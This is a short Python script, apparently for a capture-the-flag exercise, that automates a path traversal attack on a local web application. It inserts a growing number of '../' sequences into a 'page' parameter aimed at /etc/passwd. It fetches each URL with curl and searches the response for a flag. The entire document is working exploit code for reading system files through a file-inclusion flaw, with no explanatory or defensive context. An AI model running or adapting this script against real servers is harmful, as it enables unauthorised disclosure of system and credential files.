import subprocess

CHARS_A_INSERER = "../"
POSITION        = 37
chaine = "http://127.0.0.1:8080/index.php?page=../etc/passwd"

def modifier_chaine(chaine: str) -> str:
    return chaine[:POSITION] + CHARS_A_INSERER + chaine[POSITION:]

for i in range(1, 10):
    chaine = modifier_chaine(chaine)
    print(f"URL : {chaine}")
 
    try:
        curl = subprocess.run(
            ["curl", "-s", chaine],
            capture_output=True, text=True, timeout=10
        )
 
        grep = subprocess.run(
            ["grep", "flag"],
            input=curl.stdout,
            capture_output=True, text=True
        )
 
        if grep.stdout:
            print(f"success : {grep.stdout.strip()}")
            break
        else:
            print("failed")
 
    except subprocess.TimeoutExpired:
        print("Timeout")
    except Exception as e:
        print(f"Erreur : {e}")
